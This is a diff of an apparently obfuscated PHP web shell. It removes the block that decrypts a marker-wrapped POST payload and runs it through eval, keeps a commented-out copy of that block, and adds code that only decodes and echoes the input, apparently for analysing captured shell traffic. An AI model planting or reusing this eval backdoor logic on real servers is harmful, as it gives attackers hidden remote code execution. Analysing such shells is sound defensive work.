@@ -18,15 +18,21 @@ function x($t,$k)
 	return $o;
 }
 
-if(@preg_match("/$kh(.+)$kf/",@file_get_contents( "php://input"),$m)==1)
-{
-	@ob_start();
-	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
-	$o=@ob_get_contents();
-	@ob_end_clean();
-	$r=@base64_encode(@x(@gzcompress($o),$k));
-	print("$p$kh$r$kf");
-} 
+$userinput = file_get_contents("php://input");
+$base64 = base64_decode($userinput);
+$xor = x($base64, $k);
+$result = gzuncompress($xor);
+echo $result;
+
+#if(@preg_match("/$kh(.+)$kf/",@file_get_contents( "php://input"),$m)==1)
+#{
+#	@ob_start();
+#	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+#	$o=@ob_get_contents();
+#	@ob_end_clean();
+#	$r=@base64_encode(@x(@gzcompress($o),$k));
+#	print("$p$kh$r$kf");
+#}
 
 #$N=str_replace('','','create_function');
 #$u=str_replace('','',$V.$d.$P.$c.$B);
